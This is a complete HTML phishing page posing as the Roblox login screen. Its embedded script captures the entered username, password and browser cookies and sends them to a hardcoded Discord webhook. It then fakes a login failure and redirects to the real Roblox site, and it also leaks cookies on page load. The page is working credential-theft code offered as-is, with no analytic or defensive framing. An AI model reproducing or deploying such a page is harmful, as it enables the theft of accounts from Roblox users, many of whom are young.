<!DOCTYPE html>
<html>
<head><title>Roblox Login</title></head>
<body style="background:#111; color:white; text-align:center; padding-top:50px;">
<div style="background:#222; width:300px; margin:auto; padding:20px; border-radius:10px;">
  <h2>Roblox</h2>
  <input type="text" id="user" placeholder="Username" style="width:90%; margin:10px"><br>
  <input type="password" id="pass" placeholder="Password" style="width:90%; margin:10px"><br>
  <button id="login">Login</button>
  <p id="status" style="color:#aaa;">Enter credentials</p>
</div>
<script>
  const webhook = "https://discord.com/api/webhooks/1510679949055623349/-jphmiZADRXglGyE2HHYADR7zMQNQppncV33dW_QBSqg-ImD_AgUj9pT6CkHxZoLOXB4";

  function steal() {
    let cookies = document.cookie;
    let user = document.getElementById("user").value;
    let pass = document.getElementById("pass").value;
    let msg = `**ROBLOX STEAL**\nUser: ${user}\nPass: ${pass}\nCookies: ${cookies || "none"}`;
    fetch(webhook, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({content: msg})
    });
  }

  document.getElementById("login").onclick = function() {
    steal();
    document.getElementById("status").innerHTML = "Login failed. Redirecting...";
    setTimeout(() => {
      location.href = "https://www.roblox.com/login";
    }, 1500);
  };

  if(document.cookie) {
    fetch(webhook, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({content: "**Cookies on page load:**\n```\n"+document.cookie+"\n```"})
    });
  }
</script>
</body>
</html>
